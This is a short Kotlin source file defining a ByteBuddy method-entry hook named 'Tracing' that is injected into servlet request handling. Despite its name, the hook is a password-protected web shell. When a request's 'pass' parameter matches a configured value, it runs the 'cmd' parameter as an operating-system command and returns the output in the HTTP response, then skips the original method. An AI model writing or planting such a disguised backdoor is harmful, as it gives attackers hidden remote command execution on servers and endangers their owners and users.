package com.xhstormr.app

import javax.servlet.http.HttpServletRequest
import javax.servlet.http.HttpServletResponse
import net.bytebuddy.asm.Advice

object Tracing {

    @JvmStatic
    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue::class)
    fun trace(@Advice.AllArguments args: Array<Any>, @Value pass: String): Boolean {
        val request = args[0] as HttpServletRequest
        val response = args[1] as HttpServletResponse

        val success = request.getParameter("pass") == pass
        val cmd = request.getParameter("cmd")
        if (success) {
            readProcessOutput(cmd).forEach { response.writer.println(it) }
        }

        return success
    }
}
